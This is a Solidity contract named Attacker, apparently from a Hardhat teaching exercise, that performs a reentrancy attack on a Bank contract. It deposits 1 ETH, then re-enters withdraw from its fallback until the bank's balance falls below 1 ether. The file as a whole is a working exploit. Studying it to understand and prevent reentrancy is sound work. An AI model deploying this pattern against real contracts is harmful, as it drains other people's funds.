// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Comment this line for deployment outside of Hardhat blockchains.
import "hardhat/console.sol";

// You need to describe the Bank contract to this contract (ABI equivalent).

// Method 1: local import.
// import "./Bank.sol";

// Method 2: interface (you need to declare just the methods you use).
interface IBank {
    function withdraw() external;
    function deposit() payable external;
}

contract Attacker {
    
    // Method 1.
    // Bank public bank;

    // Method 2.
    IBank public bank;

    constructor(address _bankAddress) {
        // Method 1.
        // bank = Bank(_bankAddress);

        // Method 2.
        bank = IBank(_bankAddress);
    }

    // Fallback is called when bank sends Ether to this contract.
    fallback() external payable {
        console.log("***Attacker's fallback");
        if (address(bank).balance >= 1 ether) {
            console.log('One more withdraw.');
            bank.withdraw();
        }
    }

    function attack() external payable {
        console.log('The attack starts!');

        require(msg.value >= 1 ether, "We need at least 1 ETH to attack...");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}